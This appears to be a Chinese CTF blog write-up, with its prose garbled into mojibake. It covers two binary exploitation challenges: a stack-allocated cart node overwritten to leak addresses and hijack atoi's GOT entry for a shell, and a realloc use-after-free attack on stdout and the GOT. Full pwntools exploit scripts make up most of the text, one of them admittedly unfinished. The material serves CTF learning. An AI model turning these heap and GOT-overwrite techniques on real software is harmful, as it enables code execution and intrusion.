<p>å½“æ‰€è´­ç‰©å“æ€»ä»·ç­‰äº7174æ—¶ï¼Œæ²¡æœ‰ç”¨å †è®°å½•èŠ‚ç‚¹å¹¶é“¾æ¥åˆ°é“¾è¡¨ä¸Šï¼Œè€Œæ˜¯æŠŠä¿¡æ¯è®°å½•åœ¨æ ˆä¸Šé¢ï¼Œå †ä¸Šçš„ä¿¡æ¯æˆ‘ä»¬ä¸å¯èƒ½æ”¹å†™ï¼Œä½†æ˜¯æ ˆä¸Šçš„æ•°æ®æ˜¯å¯èƒ½çš„å•Š,å¦‚æœèƒ½æ”¹å†™è¿™ä¸ªèŠ‚ç‚¹ä¿¡æ¯ï¼Œé‚£å°±å¯ä»¥å¹²å¥½å¤šäº‹äº†ã€‚</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int cart()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v2; // [esp+18h] [ebp-30h]</span><br><span class="line">  int v3; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  int i; // [esp+20h] [ebp-28h]</span><br><span class="line">  char buf[22]; // [esp+26h] [ebp-22h] BYREF</span><br><span class="line">  unsigned int v6; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  v2 = 1;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(buf, 0x15u);</span><br><span class="line">  if ( buf[0] == 121 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;==== Cart ====&quot;);</span><br><span class="line">    for ( i = *(_DWORD *)&amp;byte_804B070; i; i = *(_DWORD *)(i + 8) )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v2++;</span><br><span class="line">      printf(&quot;%d: %s - $%d\n&quot;, v0, *(const char **)i, *(_DWORD *)(i + 4));</span><br><span class="line">      v3 += *(_DWORD *)(i + 4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>handlerçš„æ‰€æœ‰åˆ†æ”¯å‡½æ•°çš„ebpéƒ½æ˜¯ä¸å˜çš„ï¼Œåœ¨checkoutå‡½æ•°ä¸­èŠ‚ç‚¹ç¦»ebp0x20,åœ¨å…¶ä»–å‡½æ•°ä¸­æ¯”å¦‚ä¸Šé¢è¿™ä¸ªï¼Œbufç¦»ebp0x22,ç¦»èŠ‚ç‚¹åªå·®0x2ä¸ªå­—èŠ‚ï¼Œé‚£å°±å¯ä»¥åˆ©ç”¨Bufæ¥æ”¹å†™èŠ‚ç‚¹ä¿¡æ¯</p>
<p>å¯ä»¥é€šè¿‡æ”¹å†™èŠ‚ç‚¹ä¿¡æ¯leakåœ°å€ï¼Œæˆ‘ä»¥å‰åªä¼šleakå‡ºlibcçš„åœ°å€å’Œelfçš„åœ°å€ï¼Œæ²¡æƒ³åˆ°è¿˜èƒ½leakæ ˆåœ°å€ï¼Œåœ¨libcçš„environä¸­å°±è®°å½•ç€ä¸€ä¸ªæ ˆåœ°å€ï¼Œåˆ©ç”¨è¿™ä¸ªæ ˆåœ°å€å°±å¯ä»¥æ¨å‡ºæ‰€ä»¥æ ˆåœ°å€äº†ã€‚</p>
<p>leakå®Œåœ°å€å°±è¯¥æ§åˆ¶ç¨‹åºæµäº†ï¼Œå¯æƒœçš„æ˜¯è¿™é“é¢˜ä¸èƒ½ç›´æ¥æ”¹gotè¡¨ï¼Œè„±é“¾æ“ä½œæ˜¯åŒå‘çš„ï¼Œsystemé‚£å—åœ°å€ä¸èƒ½å†™ï¼Œé‚£è¯¥æ€ä¹ˆæ§åˆ¶ç¨‹åºæµå‘¢ï¼Œè¿™é“é¢˜æœ€å¦™çš„åœ°æ–¹æ¥äº†ğŸ˜Šï¼Œå…ˆæ˜¯åˆ©ç”¨æ ˆåœ°å€æŠŠebpæ”¹æˆatoi_got+0x22,ç„¶åé€€å‡ºdelç¨‹åºï¼Œç„¶åebpå°±æŒ‡å‘äº†atoi_gotäº†ï¼Œç„¶åç¨‹åºæ ¹æ®ebpçš„å€¼ä¸ºç´¢å¼•è¿›è¡Œå†™æ“ä½œ,å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">22</span>]; <span class="comment">// [esp+16h] [ebp-22h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    my_read(nptr, <span class="number">0x15</span>u);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(nptr) )</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶nptrå°±æŒ‡å‘äº†atoi_got,å®é™…ä¸Šå°±æ˜¯å‘atoi_gotä¸­å†™å…¥æ•°æ®ï¼Œæˆ‘ä»¬å†™ä¸ªsystem+â€™;/bin/shâ€™å²‚ä¸æ˜¯å¦™å“‰</p>
<p>ä¸‹é¢æ˜¯å®Œæ•´ä»£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_apple</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Device Number&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    gdb.attach(sh,<span class="string">&#x27;b *0x08048A13&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        buy_apple(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        buy_apple(<span class="number">2</span>)</span><br><span class="line">    buy_apple(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;y\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;y\x00&#x27;</span>+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;27: &#x27;</span>)</span><br><span class="line">    libc_base=u32(sh.recv(<span class="number">4</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    environ_addr=libc_base+libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;y\x00&#x27;</span>+p32(environ_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;27: &#x27;</span>)</span><br><span class="line">    ebp=u32(sh.recv(<span class="number">4</span>))-<span class="number">260</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(ebp)</span><br><span class="line"></span><br><span class="line">    atoi_got=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(atoi_got)</span><br><span class="line">    payload=<span class="built_in">str</span>(<span class="number">27</span>)+p64(<span class="number">0</span>)+p32(atoi_got+<span class="number">0x22</span>)+p32(ebp-<span class="number">8</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Item Number&gt; &#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(p32(system)+<span class="string">&quot;;/bin/sh\x00&quot;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="relloc"><a href="#relloc" class="headerlink" title="relloc"></a>relloc</h2><p>â€‹    å…¨ç¨‹ä½¿ç”¨reallocå‡½æ•°è¿›è¡Œå †çš„ç”³è¯·å’Œé‡Šæ”¾ï¼Œä¸‹é¢æ˜¯reallocå‡½æ•°çš„ç‰¹æ€§</p>
<ul>
<li>å½“<code>size</code>ä¸º0ï¼Œå°±ç­‰äº<code>free()</code>å‡½æ•°ï¼ŒåŒæ—¶è¿”å›å€¼ä¸ºNULL</li>
<li>å½“æŒ‡é’ˆä¸º0ï¼Œ<code>size</code>å¤§äº0ï¼Œå°±ç­‰äº<code>malloc()</code>å‡½æ•°</li>
<li><code>size</code>å°äºç­‰äºåŸæ¥çš„<code>size</code>ï¼Œåˆ™åœ¨åŸå †å—ä¸Šç¼©å°ï¼Œå¤šä½™çš„å¤§å°<code>free()</code>æ‰</li>
<li><code>size</code>å¤§äºåŸæ¥çš„<code>size</code>ï¼Œå¦‚æœ<code>bin</code>ä¸­æœ‰å¤šä½™çš„å †å—å°±è¿›è¡Œæ‰©å……ï¼Œæ²¡æœ‰å¤šä½™çš„å †å—åˆ™é‡æ–°åˆ†é…æ–°çš„å †å—ï¼Œå¹¶å°†å†…å®¹å¤åˆ¶åˆ°æ–°çš„å †å—ä¸­ï¼Œç„¶åå†å°†åŸæ¥çš„å †å—<code>free()</code>æ‰</li>
</ul>
<h3 id="æ¼æ´-1"><a href="#æ¼æ´-1" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>åœ¨reallocateçš„æ—¶å€™åªé™åˆ¶çš„æœ€å¤§å€¼ï¼Œæ²¡æœ‰é™åˆ¶æœ€å°å€¼ï¼Œæ‰€ä»¥å¯ä»¥è¾“å…¥0é€ æˆufa.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reallocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">1</span> || !heap[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">realloc</span>((<span class="keyword">void</span> *)heap[v1], size);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">  heap[v1] = v3;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read_input(heap[v1], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1"></a>æ€è·¯1</h4><p>è¿™ä¸ªå‡½æ•°æ²¡æœ‰showåŠŸèƒ½ï¼Œæ‰€ä»¥æœ¬æ¥è®¡åˆ’æ˜¯æ‹¿ufaæ‰“stdoutï¼Œæ‰“ä¹Ÿæ‰“æˆåŠŸäº†ï¼Œlibcåœ°å€ä¹Ÿæ‹¿åˆ°äº†ï¼Œä½†æ˜¯heap[0]è¿™ä¸ªæŒ‡é’ˆç®—è´¹äº†ï¼Œå› ä¸ºreallocå‡½æ•°ä¼šå¯¹ä¼ è¿›æ¥çš„æŒ‡é’ˆè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœä¸æ˜¯å †ä¸Šçš„åœ°å€å°±ä¼šæŠ¥é”™é€€å‡ºï¼Œheap[0]å·²ç»æŒ‡å‘äº†stdoutäº†ï¼Œåç»­æ²¡æ³•å†ä½¿ç”¨heap[0],æœ€å¯æ¶çš„æ˜¯è¿™ä¸ªç¨‹åºåªèƒ½æœ‰ä¸¤ä¸ªæŒ‡é’ˆï¼Œå‰©ä¸‹çš„ä¸€ä¸ªæŒ‡æ­£æ ¹æœ¬æ²¡åŠæ³•ç”³è¯·åˆ°åˆ«çš„åœ°æ–¹ï¼Œæˆ‘æ˜¯åšä¸åˆ°ï¼Œè™½ç„¶æ²¡åšå‡ºæ¥ï¼Œä½†è¿˜æ˜¯æŠŠè„šæœ¬æ”¾å‡ºæ¥ï¼Œå› ä¸ºåœ¨æ‰“stdoutçš„æ—¶å€™è¿˜åˆ©ç”¨äº†malloc_consolidateï¼Œåˆ©ç”¨scanfç”³è¯·ä¸€ä¸ªlargebinå¤§å°çš„å †ï¼Œç„¶åå°±ä¼šè§¦å‘malloc_consolidateåˆå¹¶fastbinç›¸é‚»çš„å †å—æ”¾åˆ°smallbinä¸Šé¢ï¼Œç®—æ˜¯ä¸€ä¸ªå°çŸ¥è¯†ç‚¹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">scanf_got=elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line">scanf_addr=libc.sym[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line">system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">atoi_addr=libc.sym[<span class="string">&#x27;atoll&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(scanf_addr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ufa</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x401429&#x27;)</span></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        ufa(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        realloc(<span class="number">0</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>))</span><br><span class="line">    ufa(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x600</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">&#x27;\x58\xe7&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    payload=p64(<span class="number">0</span>)+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    <span class="comment">#payload=p64(0)*3</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    free</span><br><span class="line">    </span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    ufa(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x48</span>,p64(scanf_got)+p64(<span class="number">0</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h4 id="æ€è·¯äºŒ"><a href="#æ€è·¯äºŒ" class="headerlink" title="æ€è·¯äºŒ"></a>æ€è·¯äºŒ</h4><p>è¿™ä¸ªåˆ©ç”¨æ–¹æ³•ä¸è¡Œé‚£å°±æ¢ç§åˆ©ç”¨æ–¹æ³•ï¼Œæ—¢ç„¶èƒ½ä»»æ„åœ°å€ç”³è¯·é‚£å°±ç›´æ¥ç”³è¯·åˆ°gotè¡¨ä¸Šé¢è¿›è¡Œçˆ†ç ´systemåœ°å€å®Œæˆgetshell,æˆ‘é‡‡ç”¨atollçš„gotè¡¨é¡¹ï¼Œå› ä¸ºatollçš„åç§»å’Œsystemåç§»å¾ˆåƒ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system:0x4f550</span><br><span class="line">atoll: 0x407d0</span><br></pre></td></tr></table></figure>

